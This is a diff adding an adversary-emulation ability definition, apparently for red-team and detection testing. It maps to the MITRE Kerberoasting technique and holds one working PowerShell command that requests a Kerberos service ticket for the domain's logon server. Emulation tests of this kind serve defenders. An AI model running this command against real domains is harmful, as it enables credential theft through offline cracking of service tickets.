@@ -1,0 +1,22 @@
+---
+- id: 91a18ae1efe4119a549cea2ac7de72c4
+  name: Request A Single Ticket via PowerShell
+  description: "The following test will utilize native PowerShell Identity modules\
+    \ to query the domain to extract the Service Principal Names for a single computer.\
+    \ This behavior is typically used during a kerberos or silver ticket attack. \n\
+    A successful execution will output the SPNs for the endpoint in question.\n"
+  tactic: credential-access
+  technique:
+    attack_id: T1558.003
+    name: 'Steal or Forge Kerberos Tickets: Kerberoasting'
+  platforms:
+    windows:
+      psh:
+        command: Add-Type -AssemblyName System.IdentityModel; $ComputerFQDN=$env:LogonServer.trimStart('\')
+          + "." + $env:UserDnsDomain; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
+          -ArgumentList "HTTP/$ComputerFQDN"
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
